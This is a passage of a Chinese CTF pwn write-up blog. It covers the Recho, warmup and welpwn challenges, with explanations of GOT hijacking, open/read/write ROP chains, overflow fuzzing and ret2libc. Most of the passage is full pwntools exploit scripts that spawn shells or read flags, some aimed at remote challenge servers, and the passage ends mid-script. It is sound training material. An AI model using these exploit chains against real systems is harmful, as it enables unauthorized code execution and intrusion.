<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831171816449.png?raw=true" alt="image-20210831171816449.png"></p>
<p>我们看看红色框框里的语句是什么意思</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040070d : add byte ptr [rdi], al ; ret</span><br><span class="line">我们通过汇编知识解读一下</span><br><span class="line">将al中的值加到rdi寄存器存储的内容的地址中</span><br><span class="line">也就是说如果我们这时候rdi存在的是alarm的got表</span><br><span class="line">那么[rdi]指向的就是alarm的got表地址</span><br><span class="line">最后的解读就是</span><br><span class="line">alarm的got表地址+5 &#x3D;&#x3D; 也就是我们刚刚看到的got表信息中的syscall</span><br><span class="line">再次调用alarm时就会变成调用syscall					--因为我们通过上面这个语句已经修改了alarm的got表地址</span><br></pre></td></tr></table></figure>

<p>那么我们可以用小的gadget来让rdi指向alarm的got</p>
<p>那么al怎么控制呢</p>
<p>我们知道64位中ax寄存器可以分为al,ah这两个16位的寄存器，也就是说如果我们能够控制ax让其低4四位为5即可</p>
<p>那么ax对应的就是rax，那么我们只需要找到pop rax即可完成控制</p>
<p>最后我们劫持了got表之后能完成系统调用了，我们应该做点什么呢？</p>
<p>这时候就是ORW了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O 		--open			利用open的系统调用打开flag文件</span><br><span class="line">R		--read			将打开的flag文件内容写到一处地址上一般为bss上</span><br><span class="line">W		--write			将写入的内容打印出来获取flag</span><br></pre></td></tr></table></figure>

<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,54414)</span><br><span class="line">elf &#x3D; ELF(&#39;Recho&#39;)</span><br><span class="line">#p &#x3D; process(&#39;Recho&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">#printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">alarm_got &#x3D; elf.got[&#39;alarm&#39;]</span><br><span class="line">alarm_plt &#x3D; elf.plt[&#39;alarm&#39;]</span><br><span class="line">read_plt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x00000000004008a3</span><br><span class="line">add_rdi &#x3D; 0x000000000040070d</span><br><span class="line">pop_rsi_r15 &#x3D; 0x00000000004008a1</span><br><span class="line">pop_rdx &#x3D; 0x00000000004006fe</span><br><span class="line">pop_rax &#x3D; 0x00000000004006fc</span><br><span class="line">flag_addr &#x3D; 0x601058</span><br><span class="line">bss_addr &#x3D; 0x601080</span><br><span class="line">#bss_addr &#x3D; elf.bss()						--这里注意了，这种写法找的bss段时不可以成功的</span><br><span class="line">p.recvuntil(&quot;Welcome to Recho server!\n&quot;)</span><br><span class="line">p.sendline(str(0x200))						--这里也是小细节，如果写出“0x200”的话时不能够成功对应0x200的</span><br><span class="line">**实现劫持got表**</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x38							--0x30的填充+ebp的8位</span><br><span class="line">payload +&#x3D; p64(pop_rdi) + p64(alarm_got) </span><br><span class="line">payload +&#x3D; p64(pop_rax) + p64(0x5) </span><br><span class="line">payload +&#x3D; p64(add_rdi)</span><br><span class="line">**利用劫持的got表实现open的系统调用**</span><br><span class="line">#payload +&#x3D; p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">payload +&#x3D; p64(pop_rsi_r15) + p64(0) + p64(0)</span><br><span class="line">payload +&#x3D; p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">payload +&#x3D; p64(pop_rax) + p64(2) + p64(alarm_plt)</span><br><span class="line">**完成flag的写入**</span><br><span class="line">payload +&#x3D; p64(pop_rdi) + p64(3) </span><br><span class="line">payload +&#x3D; p64(pop_rsi_r15) + p64(bss_addr) + p64(0) </span><br><span class="line">payload +&#x3D; p64(pop_rdx) + p64(0x100) + p64(read_plt)</span><br><span class="line">**小技巧使用printf更方便读出flag**</span><br><span class="line">payload +&#x3D; p64(pop_rdi) + p64(bss_addr) + p64(printf_plt)</span><br><span class="line"></span><br><span class="line">**利用write也是可以完成**</span><br><span class="line">payload +&#x3D; p64(pop_rdi) + p64(1)</span><br><span class="line">payload +&#x3D; p64(pop_rsi_r15) + p64(bss_addr) + p64(0) </span><br><span class="line">payload +&#x3D; p64(pop_rdx) + p64(0x100) + p64(write_plt)</span><br><span class="line"></span><br><span class="line">**因为输入的大小在第一次输入的时候就确定了，所以必须填写完**</span><br><span class="line">payload &#x3D;payload.ljust(0x200,&quot;\x00&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.shutdown(&quot;write&quot;)							--特别注意，如果没有这句话的话程序无法显示flag</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.关于系统调用</p>
<p>64位与32位的系统调用号是不一样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_open 2				--64位</span><br><span class="line">#define __NR_open 5				--32位</span><br></pre></td></tr></table></figure>

<p>2.劫持got表</p>
<p>我们可以利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add  [rdi] , al				--这样的操作来完成劫持got表</span><br><span class="line">语句分享</span><br><span class="line">1.找到这类语句</span><br><span class="line">ROPgadget --binary Recho --only &#39;add|ret&#39;</span><br><span class="line">2.查看某个操作的got表</span><br><span class="line">disassemble + 函数名</span><br></pre></td></tr></table></figure>

<p>3.open函数的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># fd &#x3D; open(flag, READONLY);			--open函数是两个参数</span><br><span class="line">这里我们还要注意一个点这里打开完flag文件之后读取时read的第一个参数不是0而是3</span><br><span class="line">open以后，fd的值一般是3开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。如果特殊，具体看调试结果</span><br><span class="line">#read(fd, bss_addr, 0x100)</span><br></pre></td></tr></table></figure>

<p>4.如何利用pwntools工具跳出无限循环</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.shutdown(&quot;write&quot;)</span><br></pre></td></tr></table></figure>

<h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831210306844.png?raw=true" alt="image-20210831210306844.png"></p>
<p>我们看到这题无附件只有一个nc借口，是目前还没遇到过的题目</p>
<p>我们连接一下试试</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831210424113.png?raw=true" alt="image-20210831210424113.png"></p>
<p>会给我们一个地址，然后进行一次输入</p>
<p>全文没有任何提示，那么我们要怎么做呢？</p>
<p>我们借鉴下别人的做法吧</p>
<h2 id="构思-1"><a href="#构思-1" class="headerlink" title="构思"></a>构思</h2><p>首先这是FUZZ类型的题目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FUZZ是一种模糊测试</span><br></pre></td></tr></table></figure>

<p>那么我们能够想到什么呢？</p>
<p>那就是这个输入会不会有栈溢出呢？</p>
<p>因为它给了我们一个地址，那么如果我们能够栈溢出到这个地址是不是就会发生什么</p>
<p>于是我们就要写下脚本来爆破</p>
<p>那么脚本需要解决以下几个难题:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.需要设置循环			--类似于&#39;a&#39; * num</span><br><span class="line">2.我们不知道程序是32位的还是64位的		--那么我们就要分分别测试	&#39;a&#39; * num + p32&#x2F;p64</span><br><span class="line">3.我们需要接收内容然后print</span><br></pre></td></tr></table></figure>

<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">addr &#x3D; 0x40060d								--这个地址不会改变</span><br><span class="line"></span><br><span class="line">def fuzz(p, num, flag):</span><br><span class="line">    payload &#x3D; &#39;a&#39; * num						--测试溢出的大小</span><br><span class="line">    if flag&#x3D;&#x3D;1:								--测试是几位的程序</span><br><span class="line">        payload +&#x3D; p32(addr)</span><br><span class="line">    if flag&#x3D;&#x3D;2:</span><br><span class="line">        payload +&#x3D; p64(addr)</span><br><span class="line">    p.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    for i in range(500):				--设定溢出的范围</span><br><span class="line">        print(i)						--打印测试的次数</span><br><span class="line">        for j in range(1,3):			--这里注意为什么是这样而不是range(3)</span><br><span class="line">        								--大家可以去测试一下range(3)的内容是0,1,2</span><br><span class="line">        								--range(1,3)的内容只有1，2更高效</span><br><span class="line">            try:</span><br><span class="line">                p &#x3D; remote(&quot;111.200.241.244&quot;,59913)</span><br><span class="line">                fuzz(p, i, j)</span><br><span class="line">                text &#x3D; p.recv()			--接收文本</span><br><span class="line">                print(&#39;text.len&#x3D;&#39;+str(len(text))+&#39;text&#x3D;&#39;+text)		--打印接收的内容</span><br><span class="line">                print(&#39;num&#x3D;&#39;+str(i)+&#39; flag&#x3D;&#39;+str(j))				--报告溢出的长度和程序是多少位的</span><br><span class="line">                p.interactive()</span><br><span class="line">            except:</span><br><span class="line">                p.close()											--使得程序能一直自动循环</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h1><h2 id="checksec并查看运行流程-1"><a href="#checksec并查看运行流程-1" class="headerlink" title="checksec并查看运行流程"></a>checksec并查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901154409550.png?raw=true" alt="image-20210901154409550.png"></p>
<p>64位的程序且开了NX和半开的RELRO</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901154539127.png?raw=true" alt="image-20210901154539127.png"></p>
<p>我们发现会进行一次输入后打印输入的内容，但不知道为会出现一行奇怪的内容，但也不是格式化字符串，溢出也会报错</p>
<h2 id="利用IDA查看分析"><a href="#利用IDA查看分析" class="headerlink" title="利用IDA查看分析"></a>利用IDA查看分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901155013421.png?raw=true" alt="image-20210901155013421.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901155006018.png?raw=true" alt="image-20210901155006018.png"></p>
<p>那么我们现在的思路就是利用我们第一次输入的内容填充s2的时候达到溢出效果,然后ret2libc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*0x18 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure>

<h3 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;welpwn&#39;)</span><br><span class="line">p &#x3D; process(&#39;welpwn&#39;)</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">pop_r12 &#x3D; 0x000000000040089C</span><br><span class="line">pop_rbx &#x3D; 0x000000000040089A</span><br><span class="line">start_addr &#x3D; 0x400630</span><br><span class="line">move_ret &#x3D; 0x0000000000400880</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x00000000004008a3</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x18 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901155323230.png?raw=true" alt="image-20210901155323230.png"></p>
<p>直接报错，这个应该是跳转错误，为什么还会ret到aaaaa里面去呢？难道是偏移错了吗</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901155606090.png?raw=true" alt="image-20210901155606090.png"></p>
<p>利用cyclic测试一下发现偏移是没有错的，那么那里错了呢？</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>关于栈的布局</p>
<p>我们看看程序中跳转的顺序</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901155757196.png?raw=true" alt="image-20210901155757196.png"></p>
<p>是不是先进行第一次的输入，然后再跳转到echo函数</p>
<p>这时候栈的布局是不是先开一个read的栈，然后在它上面开一个echo的栈道布局</p>
<p>这里偷一下别人的图</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901155858688.png?raw=true" alt="image-20210901155858688.png"></p>
<p>这时候的栈布局如上，这时候再回忆一下echo里面的赋值语句，如果s2被赋值之后会溢出到buf中那么就会是以下的情况</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901160017410.png?raw=true" alt="image-20210901160017410.png"></p>
<p>这里也就是为什么我们pop_rdi到aaaa的原因了，那么我们就需要跳过这几个aaaaa，也就是需要四个pop</p>
<p>但当时我想的是为什么不能利用4个ret，现在想想pop_ret的结果就是把aaaapop出来当做ret的地址，这不还是错的吗</p>
<p>那么我们就需要能够pop4个地址，后还能ret的ROP积木，这么长的积木一般很少见，所以我们一下子就想到了通用ROP中的一段</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901160322246.png?raw=true" alt="image-20210901160322246.png"></p>
<p>我们是不是可以截取一段呢，直接从pop r12开始这样就可以达到目的了</p>
<h3 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;welpwn&#39;)</span><br><span class="line">p &#x3D; process(&#39;welpwn&#39;)</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">pop_r12 &#x3D; 0x000000000040089C</span><br><span class="line">pop_rbx &#x3D; 0x000000000040089A</span><br><span class="line">start_addr &#x3D; 0x400630</span><br><span class="line">move_ret &#x3D; 0x0000000000400880</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x00000000004008a3</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x18 + p64(pop_r12) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">#p.recv(24)</span><br><span class="line">puts_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901160735475.png?raw=true" alt="image-20210901160735475.png"></p>
<p>成功泄露出puts的地址，那么接下来就是熟悉的内容了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;welpwn&#39;)</span><br><span class="line">p &#x3D; process(&#39;welpwn&#39;)</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">pop_r12 &#x3D; 0x000000000040089C</span><br><span class="line">pop_rbx &#x3D; 0x000000000040089A</span><br><span class="line">start_addr &#x3D; 0x400630</span><br><span class="line">move_ret &#x3D; 0x0000000000400880</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x00000000004008a3</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x18 + p64(pop_r12) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">#p.recv(24)</span><br><span class="line">puts_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base &#x3D; puts_addr - libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&#39;bin_sh_addr&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x18 + p64(pop_r12) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是啊！</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901161130554.png?raw=true" alt="image-20210901161130554.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210901161215365.png?raw=true" alt="image-20210901161215365.png"></p>
<p>无论是本地还是远程都打不通，我换了好几个泄露的地址但都是错的，去网站上找read-250的偏移下的版本也有问题</p>
<h2 id="借鉴-DynELF做法"><a href="#借鉴-DynELF做法" class="headerlink" title="借鉴-DynELF做法"></a>借鉴-DynELF做法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p&#x3D;remote(&#39;111.198.29.45&#39;,41724)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;welpwn&#39;)</span><br><span class="line">write_plt&#x3D;elf.symbols[&#39;write&#39;]</span><br><span class="line">read_got&#x3D;elf.got[&#39;read&#39;]</span><br><span class="line">write_got&#x3D;elf.got[&#39;write&#39;]</span><br><span class="line">read_plt&#x3D;elf.symbols[&#39;read&#39;]</span><br><span class="line">start_addr&#x3D;0x0400630</span><br><span class="line">pop4_addr&#x3D;0x040089c</span><br><span class="line">pop6_addr&#x3D;0x040089a</span><br><span class="line">mov_addr&#x3D;0x0400880</span><br><span class="line">def leak(address):</span><br><span class="line">    print p.recv(1024)</span><br><span class="line">    payload1&#x3D;&#39;A&#39;*24+p64(pop4_addr)+p64(pop6_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(address)+p64(1)+p64(mov_addr)+&#39;A&#39;*56+p64(start_addr)</span><br><span class="line">    payload1&#x3D;payload1.ljust(1024,&#39;C&#39;)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data&#x3D;p.recv(8)</span><br><span class="line">    #print &quot;%x &#x3D;&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;))</span><br><span class="line">    return data</span><br><span class="line">d&#x3D;DynELF(leak,elf&#x3D;ELF(&#39;.&#x2F;welpwn&#39;))</span><br><span class="line">sys_addr&#x3D;d.lookup(&#39;system&#39;,&#39;libc&#39;)</span><br><span class="line">print hex(sys_addr)</span><br><span class="line">bss_addr&#x3D;elf.bss()</span><br><span class="line">prdi_addr&#x3D;0x04008a3</span><br><span class="line">print p.recv(1024)</span><br><span class="line">payload2&#x3D;&#39;A&#39;*24+p64(pop4_addr)+p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(bss_addr)+p64(0)+p64(mov_addr)+&#39;A&#39;*56+p64(prdi_addr)+p64(bss_addr)+p64(sys_addr)+&#39;a&#39;*8</span><br><span class="line">payload2&#x3D;payload2.ljust(1024,&#39;C&#39;)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后我改良了一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,52537)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;welpwn&#39;)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span 